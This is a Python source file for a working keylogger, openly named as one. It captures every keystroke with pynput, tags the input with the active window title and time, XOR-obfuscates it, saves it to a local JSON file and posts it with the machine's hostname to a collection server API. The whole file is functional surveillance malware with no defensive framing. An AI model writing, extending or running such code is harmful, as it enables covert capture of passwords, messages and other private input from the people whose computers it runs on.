from flask import jsonify
from pynput import keyboard
from datetime import datetime
import pygetwindow as gw
from abc import ABC, abstractmethod
import json
import threading
import socket
import requests
import time

class IKeyLogger(ABC):

    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> dict:
        pass


class KeyLoggerService(IKeyLogger):

    def __init__(self):
        self.data = {}
        self.running = False

    def get_logged_keys(self) -> dict:
        data = self.data.copy()
        self.data.clear()
        return data

    def start_logging(self) -> None:
        self.running = True

    def stop_logging(self) -> None:
        self.running = False

    def get_keyword(self, key):
        if not self.running:
            return

        window = KeyLoggerService._get_window()
        if window not in self.data:
            self.data[window] = {}
        time = KeyLoggerService._get_time()
        if time not in self.data[window]:
            self.data[window][time] = ""

        try:
            key_str = key.char if hasattr(key, 'char') and key.char is not None else str(key)

            if key_str.startswith("Key."):

                if key_str == "Key.space":
                    self.data[window][time] += " "
                elif key_str == "Key.enter":
                    self.data[window][time] += "\n"
                elif key_str == "Key.backspace" and len(self.data[window][time]) >= 1:
                    self.data[window][time] = self.data[window][time][:-1]
            else:
                self.data[window][time] += key_str
        except Exception as e:
            print(f"Error processing key: {e}")

    @staticmethod
    def _get_time():
        return datetime.now().strftime("%Y-%m-%d %H:%M")

    @staticmethod
    def _get_window():
        window = gw.getActiveWindow()
        return window.title if window else "Unknown Window"

class IWriter:
    @abstractmethod
    def send_data(self, data: dict, machine_name: str):
        pass

class FileWriter(IWriter):
    def send_data(self, data: dict, machine_name: str):
        try:
            with open("log.json", "r") as file:
                try:
                    origin_data = json.load(file)
                except json.JSONDecodeError:
                    origin_data = {}
        except FileNotFoundError:
            origin_data = {}

        for window in data:
            if window not in origin_data:
                origin_data[window] = {}
            for time in data[window]:
                if time not in origin_data[window]:
                    origin_data[window][time] = ""
                origin_data[window][time] += str(data[window][time])

        with open("log.json", "w") as file:
            json.dump(origin_data, file, indent=4)

class Encryptor:
    def __init__(self, key="A"):
        self.key = key

    def _encrypt(self, string):
        return "".join([chr((ord(letter) ^ ord(self.key) + 1) % 256) for letter in string])

    def xor(self, data):
        encrypted_data = {}
        for key in data:
            new_key = self._encrypt(key)
            encrypted_data[new_key] = {self._encrypt(t): self._encrypt(data[key][t]) for t in data[key]}
        return encrypted_data

    def decrypt_data(self, data):
        return self.xor(data)

class NetworkWriter(IWriter):

    def send_data(self, data: dict, machine_name: str):
        try:
            response = requests.get(f"http://localhost:5000/api/computers/is_computer_running/{machine_name}")
            if response.ok:
                computer = response.json()
                if computer.get("is_running"):
                    requests.post(
                        "http://localhost:5000/api/computers",
                        json={"machine_name": machine_name, "is_running": True, "data": data},
                         headers = {
                            'Content-Type': 'application/json'
                        }
                    )

        except Exception as e:
            print(f"Error: {e}")

class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()
        self.encryptor = Encryptor()
        self.networkWriter = NetworkWriter()
        self.listener = keyboard.Listener(on_press=self.service.get_keyword)

    def start(self):
        self.service.start_logging()
        self.listener.start()
        print("Keylogger is starting!")

        try:
            while self.service.running:
                time.sleep(10)
                data = self.service.get_logged_keys()
                if data:
                    encrypted_data = self.encryptor.xor(data)
                    self.writer.send_data(encrypted_data, socket.gethostname())
                    self.networkWriter.send_data(encrypted_data, socket.gethostname())

        except KeyboardInterrupt:
            print("\nStopping Keylogger...")
            self.service.stop_logging()

        self.listener.stop()
        print("Keylogger has stopped.")


if __name__ == "__main__":
    manager = KeyLoggerManager()
    thread = threading.Thread(target=manager.start, daemon=True)
    thread.start()

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\nShutting down...")
        manager.service.stop_logging()
        thread.join()